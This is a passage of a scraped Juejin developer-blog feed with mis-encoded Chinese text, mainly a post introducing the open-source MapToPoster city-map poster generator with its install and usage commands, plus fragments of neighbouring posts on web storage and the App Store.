    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'è¯·æ±‚å¤±è´¥ï¼š'</span>, err);
  }
}
</code></pre>
<h3 data-id="heading-30">2. æœ¬åœ°å­˜å‚¨æ–¹æ¡ˆå¯¹æ¯”ï¼ˆé¢è¯•é«˜é¢‘ï¼‰</h3>





























<table><thead><tr><th>æ–¹æ¡ˆ</th><th>ç”Ÿå‘½å‘¨æœŸ</th><th>å­˜å‚¨å¤§å°</th><th>ä¸æœåŠ¡å™¨é€šä¿¡</th></tr></thead><tbody><tr><td>localStorage</td><td>æ°¸ä¹…å­˜å‚¨ï¼Œæ‰‹åŠ¨æ¸…é™¤</td><td>çº¦ 5MB</td><td>ä¸æºå¸¦ï¼Œä»…å®¢æˆ·ç«¯ä½¿ç”¨</td></tr><tr><td>sessionStorage</td><td>æ ‡ç­¾é¡µå…³é—­åæ¸…é™¤</td><td>çº¦ 5MB</td><td>ä¸æºå¸¦ï¼Œä»…å®¢æˆ·ç«¯ä½¿ç”¨</td></tr><tr><td>Cookie</td><td>å¯è®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆé»˜è®¤ä¼šè¯ï¼‰</td><td>çº¦ 4KB</td><td>æ¯æ¬¡ HTTP è¯·æ±‚è‡ªåŠ¨æºå¸¦</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€å¼ åŸå¸‚åœ°å›¾ï¼Œä¹Ÿèƒ½åšæˆé«˜çº§æ„Ÿæµ·æŠ¥â€”â€”åŸå¸‚åœ°å›¾æµ·æŠ¥ç”Ÿæˆå™¨ MapToPoster]]></title>    <link>https://juejin.cn/post/7597025960946974755</link>    <guid>https://juejin.cn/post/7597025960946974755</guid>    <pubDate>2026-01-20T09:46:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597025960946974755" data-draft-id="7597199288817778728" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€å¼ åŸå¸‚åœ°å›¾ï¼Œä¹Ÿèƒ½åšæˆé«˜çº§æ„Ÿæµ·æŠ¥â€”â€”åŸå¸‚åœ°å›¾æµ·æŠ¥ç”Ÿæˆå™¨ MapToPoster"/> <meta itemprop="keywords" content="å¼€æº,GitHub"/> <meta itemprop="datePublished" content="2026-01-20T09:46:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¶£ä¸¸æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/342703357043576"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€å¼ åŸå¸‚åœ°å›¾ï¼Œä¹Ÿèƒ½åšæˆé«˜çº§æ„Ÿæµ·æŠ¥â€”â€”åŸå¸‚åœ°å›¾æµ·æŠ¥ç”Ÿæˆå™¨ MapToPoster
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/342703357043576/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¶£ä¸¸æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:46:26.000Z" title="Tue Jan 20 2026 09:46:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æœ‰æ²¡æœ‰é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯ğŸ‘‡</p>
<ul>
<li>
<p>æƒ³æŠŠ<strong>ç”Ÿæ´»è¿‡çš„åŸå¸‚</strong>åšæˆä¸€å¼ çºªå¿µæµ·æŠ¥</p>
</li>
<li>
<p>æƒ³ç»™<strong>å…¬å¸ä¹”è¿ã€åŸå¸‚æ´»åŠ¨ã€å±•ä¼š</strong>è®¾è®¡ä¸€å¼ åœ°å›¾èƒŒæ™¯</p>
</li>
<li>
<p>æƒ³æŠŠ<strong>æ—…è¡Œè·¯çº¿ã€åŸå¸‚è®°å¿†</strong>åšå¾—æœ‰ç‚¹è®¾è®¡æ„Ÿï¼Œè€Œä¸æ˜¯æˆªå›¾ä¸€å¼ é«˜å¾·åœ°å›¾</p>
</li>
</ul>
<p>ä½†ç°å®æ˜¯ï¼š</p>
<p>ğŸ‘‰ PS å¤ªé‡</p>
<p>ğŸ‘‰ ä¸“ä¸šåœ°å›¾è½¯ä»¶å¤ªå¤æ‚</p>
<p>ğŸ‘‰ æˆªå›¾å¤ªä¸‘ï¼Œè¿˜å¸¦æ°´å°</p>
<p>ç›´åˆ°æˆ‘æœ€è¿‘è¯•ç”¨äº†ä¸€ä¸ªå·¥å…·â€”â€”<strong>MapToPosterï¼ˆåŸå¸‚åœ°å›¾æµ·æŠ¥ç”Ÿæˆå™¨ï¼‰</strong>ã€‚</p>
<h2 data-id="heading-0">ç®€ä»‹</h2>
<h3 data-id="heading-1">MapToPoster æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>ä¸€å¥è¯æ¦‚æ‹¬ï¼š</p>
<blockquote>
<p><strong>ä¸ºä¸–ç•Œä¸Šçš„ä»»ä½•ä¸€åº§åŸå¸‚ç”Ÿæˆç²¾ç¾ã€ç®€çº¦çš„åœ°å›¾æµ·æŠ¥</strong></p>
</blockquote>
<p>å¼€æºé¡¹ç›®åœ°å€: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foriginalankur%2Fmaptoposter" target="_blank" title="https://github.com/originalankur/maptoposter" ref="nofollow noopener noreferrer">github.com/originalankâ€¦</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8cf9ef85e6f485d80542906926d7ade~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Laj5Li45oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507186&amp;x-signature=%2BZrqH7ctreBqa8cr3mPOAE7wkIE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">å¿«é€Ÿå¼€å§‹</h2>
<h3 data-id="heading-3">Step 1ï¼šå…‹éš†é¡¹ç›®ä»£ç </h3>
<p>é¦–å…ˆï¼Œå°† MapToPoster é¡¹ç›®å…‹éš†åˆ°æœ¬åœ°</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/originalankur/maptoposter
</code></pre>
<h3 data-id="heading-4">Step 2ï¼šå®‰è£…ä¾èµ–</h3>
<p>ç¡®ä¿ä½ çš„ç¯å¢ƒä¸­å·²ç»å®‰è£…äº† <strong>Python 3.8+</strong>ï¼Œç„¶ååœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-css" lang="css">pip install -r requirements<span class="hljs-selector-class">.txt</span>
</code></pre>
<p><code>è¿™ä¸€æ­¥ä¼šè‡ªåŠ¨å®‰è£…é¡¹ç›®æ‰€éœ€çš„ä¾èµ–åº“ï¼Œæ— éœ€æ‰‹åŠ¨é€ä¸ªé…ç½®ã€‚</code></p>
<h3 data-id="heading-5">Step 3ï¼šä½¿ç”¨(å†…éƒ¨ä½¿ç”¨Nominatiméœ€ç§‘å­¦ä¸Šç½‘)</h3>
<p>å®‰è£…å®Œæˆåï¼Œé€šè¿‡ä¸€æ¡å‘½ä»¤å³å¯ç”ŸæˆåŸå¸‚åœ°å›¾æµ·æŠ¥ï¼š</p>
<pre><code class="hljs language-css" lang="css">python create_map_poster<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--city</span>  <span class="hljs-attr">--country</span>  <span class="hljs-selector-attr">[options]</span>
</code></pre>
<p>å‚æ•°è¯´æ˜ï¼š</p>



































<table><thead><tr><th>å‚æ•°å</th><th>ç®€å†™</th><th>è¯´æ˜</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr><td>--city</td><td>-c</td><td>åŸå¸‚å</td><td/></tr><tr><td>--country</td><td>-C</td><td>å›½å®¶å</td><td/></tr><tr><td>--theme</td><td>-t</td><td>ä¸»é¢˜å</td><td>feature_based</td></tr><tr><td>--distance</td><td>-d</td><td>åœ°å›¾åŠå¾„(å•ä½: ç±³)</td><td>29000</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-apache" lang="apache">python create_map_poster.py -c "Beijing" -C "China" -t noir -d 12000
</code></pre>
<p><code>è¿è¡Œå®Œæˆåï¼Œå³å¯åœ¨è¾“å‡ºç›®å½•ä¸­è·å¾—ä¸€å¼ å¯ç›´æ¥æ‰“å°æˆ–åˆ†äº«çš„é«˜æ¸…åŸå¸‚åœ°å›¾æµ·æŠ¥</code></p>
<h2 data-id="heading-6">æ•ˆæœå›¾</h2>
<p>åŸå¸‚: ä¸­å›½-åŒ—äº¬<br/>
å‘½ä»¤: python create_map_poster.py -c "Beijing" -C "China" -t neon_cyberpunk -d 12000</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d49126f6ae4241079824ea1a42153c4c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Laj5Li45oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507186&amp;x-signature=7CwLsxqtY4OOq1F7Ab3yLorOmF4%3D" alt="" loading="lazy"/></p>
<p>åŸå¸‚: ç¾å›½-çº½çº¦<br/>
å‘½ä»¤: python create_map_poster.py -c "New York" -C "USA" -t terracotta -d 12000</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02c8cc9937bc4ee7b893d877363bf6fa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Laj5Li45oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507186&amp;x-signature=3%2BmVSDkzX5%2FGILDY%2FqsnSEaiOp8%3D" alt="" loading="lazy"/></p>
<p>åŸå¸‚: æ¾³å¤§åˆ©äºš-å¢¨å°”æœ¬<br/>
å‘½ä»¤: python create_map_poster.py -c "Melbourne" -C "Australia" -t midnight_blue -d 12000</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/126e5ef6b3db41f9b335a3ba438101b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Laj5Li45oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769507186&amp;x-signature=25Plmoo1XM8etsukU4SPvjGzmHE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">ç»“è¯­</h2>
<p>åœ°å›¾ï¼Œæœ¬èº«å°±æ˜¯ä¸€ç§å¾ˆæœ‰åŠ›é‡çš„è§†è§‰è¯­è¨€ã€‚<br/>
è€Œ <strong>MapToPoster</strong> åšçš„äº‹æƒ…ï¼Œå°±æ˜¯æŠŠè¿™ç§åŠ›é‡ï¼Œ<br/>
<strong>äº¤åˆ°æ™®é€šäººæ‰‹é‡Œ</strong>ã€‚</p>
<p>å¦‚æœä½ ä¹Ÿæƒ³ï¼š</p>
<ul>
<li>
<p>æŠŠä¸€åº§åŸå¸‚ï¼Œå˜æˆä¸€å¼ æœ‰æ„ä¹‰çš„æµ·æŠ¥</p>
</li>
<li>
<p>æˆ–è€…ç»™ä½ çš„å†…å®¹ã€è®¾è®¡ã€äº§å“ï¼ŒåŠ ç‚¹â€œåŸå¸‚è´¨æ„Ÿâ€</p>
</li>
</ul>
<p>è¿™ä¸ªå·¥å…·ï¼Œå€¼å¾—ä½ è¯•ä¸€è¯•ã€‚</p>
<h4 data-id="heading-8">æ¨èé˜…è¯»</h4>
<p>â€¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484211%26idx%3D1%26sn%3Dc32735c3ac8092f74075f40e337dc713%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484211&amp;idx=1&amp;sn=c32735c3ac8092f74075f40e337dc713&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ç†¬å¤œæ•´ç†çš„ï¼é»‘å®¢çº§Chromeæ’ä»¶è®©æˆ‘æ•ˆç‡å¼€æŒ‚äº†</a><br/>
â€¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484362%26idx%3D1%26sn%3D4eabe6cfebe207124378c1a409024669%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484362&amp;idx=1&amp;sn=4eabe6cfebe207124378c1a409024669&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ç¨‹åºå‘˜å“­äº†ï¼è¿™å·¥å…·ä¸‰è¡Œä»£ç å¹²æ‰çˆ¬è™«ï¼Œç½‘å‹ï¼šå†ä¹Ÿä¸æƒ³å†™æ­£åˆ™äº†â€¦</a><br/>
â€¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484350%26idx%3D1%26sn%3D63a772412a9026c05e0123277750c995%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484350&amp;idx=1&amp;sn=63a772412a9026c05e0123277750c995&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸ä¼š Gitï¼ŸOh My Gitè®©ä½ è¾¹ç©æ¸¸æˆè¾¹å­¦ä¼šï¼</a><br/>
â€¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484197%26idx%3D1%26sn%3D0e9eb69e1fd113c9116ea4c4329fcb4f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484197&amp;idx=1&amp;sn=0e9eb69e1fd113c9116ea4c4329fcb4f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">IDEA+Continueæ’ä»¶+DeepSeek:å¼€å‘è€…æ•ˆç‡é£™å‡</a><br/>
â€¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484256%26idx%3D1%26sn%3D0c48da4a42135c320ba1d01452c69731%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484256&amp;idx=1&amp;sn=0c48da4a42135c320ba1d01452c69731&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">ä¸€åˆ†é’Ÿåˆ¶ä½œå‡ºä¸€æ¡è§†é¢‘ï¼ŸDeepSeek+å‰ªæ˜ =ç‹ç‚¸</a><br/>
â€¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Mzk1NTc5Ng%3D%3D%26mid%3D2247484186%26idx%3D1%26sn%3Da86c3b0b1cec6d491a760ae29126e8d5%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Mzk1NTc5Ng==&amp;mid=2247484186&amp;idx=1&amp;sn=a86c3b0b1cec6d491a760ae29126e8d5&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">5åˆ†é’Ÿæå®šSpringé¡¹ç›®ä¸DeepSeeké›†æˆ</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘å¸®ä½ ä»¬è¯•è¿‡äº†ï¼ŒAppStoreâ€œSIäº†ä¹ˆâ€å·²ç»æ— æ³•ä¸Šæ¶ï¼]]></title>    <link>https://juejin.cn/post/7597125475601580059</link>    <guid>https://juejin.cn/post/7597125475601580059</guid>    <pubDate>2026-01-20T10:16:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475601580059" data-draft-id="7597253913248235561" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘å¸®ä½ ä»¬è¯•è¿‡äº†ï¼ŒAppStoreâ€œSIäº†ä¹ˆâ€å·²ç»æ— æ³•ä¸Šæ¶ï¼"/> <meta itemprop="keywords" content="APP,Apple,uni-app"/> <meta itemprop="datePublished" content="2026-01-20T10:16:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOSç ”ç©¶é™¢"/> <meta itemprop="url" content="https://juejin.cn/user/1421041942671774"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘å¸®ä½ ä»¬è¯•è¿‡äº†ï¼ŒAppStoreâ€œSIäº†ä¹ˆâ€å·²ç»æ— æ³•ä¸Šæ¶ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1421041942671774/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOSç ”ç©¶é™¢
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:16:46.000Z" title="Tue Jan 20 2026 10:16:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 